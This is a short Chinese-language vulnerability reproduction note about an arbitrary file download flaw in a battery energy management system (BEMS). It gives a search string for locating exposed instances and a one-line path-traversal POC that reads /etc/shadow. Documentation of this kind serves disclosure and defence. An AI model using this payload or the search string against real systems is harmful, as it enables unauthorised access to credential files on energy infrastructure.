---
title: "龙璟科技 电池能量BEMS downloads 任意文件下载漏洞"
date: 2026-10-16 09:11:56
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "龙璟科技-电池能量BEMS-downloads"
tags:
  - "龙璟科技-电池能量BEMS-downloads"
  - "任意文件下载"
  - "漏洞复现"
---
## 漏洞描述

龙璟科技 电池能量BEMS 存在接口可任意文件下载获取服务器任意文件信息

## 漏洞影响

```
龙璟科技 电池能量BEMS
```

## 网络测绘

```
title=电池能量管理系统 BEMS
```

## 漏洞复现

登陆页面

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101906850.png)

验证POC

```plain
/api/downloads?fileName=../../../../../../../../etc/shadow
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101906628.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%BE%99%E7%92%9F%E7%A7%91%E6%8A%80-%E7%94%B5%E6%B1%A0%E8%83%BD%E9%87%8FBEMS-downloads-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
